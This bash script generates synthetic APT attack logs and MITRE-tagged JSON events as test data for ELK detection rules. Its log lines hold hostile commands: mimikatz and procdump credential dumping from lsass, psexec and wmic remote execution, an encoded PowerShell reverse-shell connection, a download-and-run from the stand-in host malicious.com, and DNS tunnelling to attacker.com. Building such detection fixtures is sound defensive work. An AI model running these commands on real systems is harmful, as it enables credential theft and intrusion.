#!/bin/bash

# Script to generate sample APT attack logs for testing detection rules
# This simulates various APT activities across the kill chain

OUTPUT_DIR="../sample-data"
mkdir -p "$OUTPUT_DIR"

echo "Generating sample APT dataset..."

# 1. Credential Dumping - Mimikatz execution
cat > "$OUTPUT_DIR/credential-dumping.log" << 'EOF'
2024-01-15T10:23:45Z hostname=VICTIM-PC process=mimikatz.exe command="sekurlsa::logonpasswords" user=ADMIN
2024-01-15T10:24:12Z hostname=VICTIM-PC process=procdump.exe command="procdump.exe -ma lsass.exe lsass.dmp" user=ADMIN
2024-01-15T10:25:33Z hostname=VICTIM-PC sysmon_event_id=10 source_process=mimikatz.exe target_process=lsass.exe granted_access=0x1FFFFF
2024-01-15T10:26:45Z hostname=VICTIM-PC process=pwdump7.exe command="pwdump7.exe > hashes.txt" user=SYSTEM
EOF

# 2. Reconnaissance commands
cat > "$OUTPUT_DIR/reconnaissance.log" << 'EOF'
2024-01-15T09:15:22Z hostname=VICTIM-PC command="whoami /all" user=compromised_user
2024-01-15T09:16:34Z hostname=VICTIM-PC command="net user /domain" user=compromised_user
2024-01-15T09:17:45Z hostname=VICTIM-PC command="net group 'Domain Admins' /domain" user=compromised_user
2024-01-15T09:18:56Z hostname=VICTIM-PC command="nltest /domain_trusts" user=compromised_user
2024-01-15T09:20:12Z hostname=VICTIM-PC command="netstat -ano" user=compromised_user
2024-01-15T09:21:23Z hostname=VICTIM-PC command="tasklist /v" user=compromised_user
2024-01-15T09:22:34Z hostname=VICTIM-PC command="ipconfig /all" user=compromised_user
2024-01-15T09:23:45Z hostname=VICTIM-PC command="net view /domain" user=compromised_user
2024-01-15T09:24:56Z hostname=VICTIM-PC command="dsquery user" user=compromised_user
EOF

# 3. Lateral Movement - RDP and SMB
cat > "$OUTPUT_DIR/lateral-movement.log" << 'EOF'
2024-01-15T11:30:15Z hostname=VICTIM-PC event_id=4624 logon_type=10 source_ip=192.168.1.100 target_user=ADMIN workstation=ATTACKER-PC
2024-01-15T11:31:22Z hostname=DC01 event_id=4624 logon_type=3 source_ip=192.168.1.100 target_user=ADMIN workstation=VICTIM-PC
2024-01-15T11:32:33Z hostname=FILESERVER event_id=5140 share_name=\\\\FILESERVER\\C$ source_ip=192.168.1.100 user=ADMIN
2024-01-15T11:33:44Z hostname=VICTIM-PC process=psexec.exe command="psexec.exe \\\\FILESERVER cmd.exe" user=ADMIN
2024-01-15T11:34:55Z hostname=FILESERVER event_id=7045 service_name=PSEXESVC image_path="C:\\Windows\\PSEXESVC.exe"
2024-01-15T11:35:06Z hostname=VICTIM-PC wmic_command="wmic /node:FILESERVER process call create 'cmd.exe'" user=ADMIN
EOF

# 4. PowerShell Execution
cat > "$OUTPUT_DIR/powershell-execution.log" << 'EOF'
2024-01-15T12:10:15Z hostname=VICTIM-PC powershell_command="powershell.exe -encodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApAA==" user=compromised_user
2024-01-15T12:11:22Z hostname=VICTIM-PC event_id=4104 script_block_text="IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')" user=compromised_user
2024-01-15T12:12:33Z hostname=VICTIM-PC powershell_command="Invoke-Mimikatz -DumpCreds" user=ADMIN
2024-01-15T12:13:44Z hostname=VICTIM-PC event_id=4104 script_block_text="[System.Convert]::FromBase64String('SGVsbG8gV29ybGQ=')" user=compromised_user
2024-01-15T12:14:55Z hostname=VICTIM-PC powershell_command="Enter-PSSession -ComputerName DC01 -Credential $cred" user=ADMIN
EOF

# 5. Data Exfiltration
cat > "$OUTPUT_DIR/data-exfiltration.log" << 'EOF'
2024-01-15T14:20:15Z hostname=VICTIM-PC protocol=https destination_ip=185.220.101.45 destination_port=443 bytes_sent=15728640 connection_duration=320s
2024-01-15T14:25:22Z hostname=VICTIM-PC protocol=ftp destination_ip=185.220.101.45 destination_port=21 bytes_sent=52428800 file=confidential_data.zip
2024-01-15T14:30:33Z hostname=VICTIM-PC protocol=dns query=aaaabbbbccccddddeeeeffffgggg1234.attacker.com query_length=65 query_count=250
2024-01-15T14:35:44Z hostname=VICTIM-PC protocol=http destination_ip=185.220.101.45 destination_port=8080 bytes_sent=104857600 user_agent="Mozilla/5.0"
EOF

# Generate JSON formatted logs for easier ingestion
cat > "$OUTPUT_DIR/apt-events.json" << 'EOF'
{"@timestamp":"2024-01-15T10:23:45Z","host":{"name":"VICTIM-PC"},"winlog":{"event_id":1,"event_data":{"Image":"C:\\\\Tools\\\\mimikatz.exe","CommandLine":"sekurlsa::logonpasswords","User":"ADMIN"}},"threat_detected":"credential_dumping","mitre_technique":"T1003.001","mitre_tactic":"Credential Access","severity":"critical"}
{"@timestamp":"2024-01-15T10:24:12Z","host":{"name":"VICTIM-PC"},"winlog":{"event_id":10,"event_data":{"SourceImage":"C:\\\\Windows\\\\System32\\\\procdump.exe","TargetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","GrantedAccess":"0x1FFFFF"}},"threat_detected":"credential_dumping","mitre_technique":"T1003.001","mitre_tactic":"Credential Access","severity":"critical"}
{"@timestamp":"2024-01-15T09:15:22Z","host":{"name":"VICTIM-PC"},"message":"whoami /all","threat_detected":"reconnaissance","mitre_technique":"T1087","mitre_tactic":"Discovery","severity":"medium"}
{"@timestamp":"2024-01-15T09:16:34Z","host":{"name":"VICTIM-PC"},"message":"net user /domain","threat_detected":"reconnaissance","mitre_technique":"T1087.002","mitre_tactic":"Discovery","severity":"medium"}
{"@timestamp":"2024-01-15T11:30:15Z","host":{"name":"VICTIM-PC"},"winlog":{"event_id":4624,"event_data":{"LogonType":"10","IpAddress":"192.168.1.100","TargetUserName":"ADMIN","WorkstationName":"ATTACKER-PC"}},"threat_detected":"lateral_movement","mitre_technique":"T1021.001","mitre_tactic":"Lateral Movement","severity":"high"}
{"@timestamp":"2024-01-15T11:31:22Z","host":{"name":"DC01"},"winlog":{"event_id":4624,"event_data":{"LogonType":"3","IpAddress":"192.168.1.100","TargetUserName":"ADMIN"}},"threat_detected":"lateral_movement","mitre_technique":"T1021.002","mitre_tactic":"Lateral Movement","severity":"high"}
{"@timestamp":"2024-01-15T12:10:15Z","host":{"name":"VICTIM-PC"},"winlog":{"event_data":{"CommandLine":"powershell.exe -encodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApAA=="}},"threat_detected":"encoded_powershell","mitre_technique":"T1059.001","mitre_tactic":"Execution","severity":"high"}
{"@timestamp":"2024-01-15T12:11:22Z","host":{"name":"VICTIM-PC"},"winlog":{"event_id":4104,"event_data":{"ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"}},"threat_detected":"powershell_download","mitre_technique":"T1059.001","mitre_tactic":"Execution","severity":"high"}
{"@timestamp":"2024-01-15T14:20:15Z","host":{"name":"VICTIM-PC"},"network":{"protocol":"https","bytes":15728640,"direction":"outbound"},"destination":{"ip":"185.220.101.45","port":443},"threat_detected":"data_exfiltration","mitre_technique":"T1041","mitre_tactic":"Exfiltration","severity":"critical"}
{"@timestamp":"2024-01-15T14:30:33Z","host":{"name":"VICTIM-PC"},"network":{"protocol":"dns"},"dns":{"question":{"name":"aaaabbbbccccddddeeeeffffgggg1234.attacker.com"}},"destination":{"port":5353},"threat_detected":"dns_tunneling","mitre_technique":"T1071.004","mitre_tactic":"Command and Control","severity":"high"}
EOF

echo "Sample APT dataset generated successfully!"
echo "Files created in: $OUTPUT_DIR"
echo ""
echo "Files:"
ls -lh "$OUTPUT_DIR"
echo ""
echo "To ingest these logs into ELK:"
echo "1. Copy files to the sample-data directory mounted in Docker containers"
echo "2. The Filebeat and Logstash configurations will automatically ingest them"
echo "3. Check Kibana for detected threats"
